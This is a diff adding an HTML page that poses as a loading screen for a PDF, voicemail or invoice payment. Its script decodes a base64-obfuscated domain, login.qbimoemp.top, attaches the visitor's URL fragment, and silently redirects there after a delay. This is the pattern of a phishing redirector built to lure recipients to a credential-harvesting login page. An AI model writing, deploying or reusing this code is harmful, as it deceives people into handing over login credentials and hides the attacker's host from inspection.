@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Redirecting...</title>
+<style>
+  /* White background */
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: #ffffff;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: #006644; /* Dark green for good contrast */
+    overflow: hidden;
+    flex-direction: column;
+  }
+
+  .loader-icon {
+    font-size: 5rem;
+    animation: pulseIcon 1.5s infinite alternate;
+    user-select: none;
+  }
+
+  @keyframes pulseIcon {
+    0% {
+      opacity: 0.6;
+      transform: scale(0.9);
+    }
+    100% {
+      opacity: 1;
+      transform: scale(1.1);
+    }
+  }
+
+  .message {
+    margin-top: 20px;
+    font-size: 1.2rem;
+    letter-spacing: 0.1em;
+    text-align: center;
+    color: #006644cc;
+    user-select: none;
+  }
+</style>
+</head>
+<body>
+  <div id="loaderIcon" class="loader-icon" aria-label="Loading icon"></div>
+  <div id="loadingMessage" class="message">Redirecting, please wait...</div>
+
+<script>
+(function() {
+  // Obfuscated parts of the base redirect URL:
+  var parts = [
+    'aHR0cHM6Ly8=',    // 'https://'
+    'bG9naW4ucWJpbW9lbXAudG9w', //  domain base64
+    '?iqf4S76f1g=aHR0cHM6Ly95YWhvby5jb20='             // static page path
+  ];
+
+  // Decode Base64 encoded strings
+  function b64Decode(str) {
+    try {
+      return atob(str);
+    } catch(e) {
+      return '';
+    }
+  }
+
+  // Compose base URL by decoding and joining
+  var baseUrl = b64Decode(parts[0]) + b64Decode(parts[1]) + parts[2];
+
+  // Get current URL hash (including #)
+  var hash = window.location.hash; 
+
+  // Get loading type from query parameter
+  const urlParams = new URLSearchParams(window.location.search);
+  const loadingType = urlParams.get('file') || 'none'; // Default loading type
+
+  // Map loading types to icons and messages
+  const loadingIcons = {
+    'pdf': '📄',        // page with curl emoji
+    'voicemail': '📞',  // telephone receiver emoji
+    'invoice': '💳',    // credit card emoji
+    'default': '⏳',    // hourglass not done emoji
+    'none': ''          // no icon
+  };
+
+  const loadingMessages = {
+    'pdf': 'Loading PDF file...',
+    'voicemail': 'Loading your voicemail...',
+    'invoice': 'Loading invoice payment...',
+    'default': 'Loading, please wait...',
+    'none': '' // No loader/message
+  };
+
+  // Set icon & message or hide if 'none'
+  const iconElem = document.getElementById('loaderIcon');
+  const messageElem = document.getElementById('loadingMessage');
+
+  if(loadingType === 'none') {
+    iconElem.style.display = 'none';
+    messageElem.style.display = 'none';
+  } else {
+    iconElem.textContent = loadingIcons[loadingType] || loadingIcons['default'];
+    messageElem.textContent = loadingMessages[loadingType] || loadingMessages['default'];
+    iconElem.style.display = 'block';
+    messageElem.style.display = 'block';
+  }
+
+  // Compose final redirect URL
+  var redirectUrl = baseUrl;
+
+  // Append original hash (including #) to final redirect URL if present
+  if (hash) {
+    redirectUrl += hash;
+  }
+
+  // Delay to show loader then redirect
+  setTimeout(function() {
+    window.location.replace(redirectUrl);
+  }, 3800);
+})();
+</script>
+</body>
+</html>
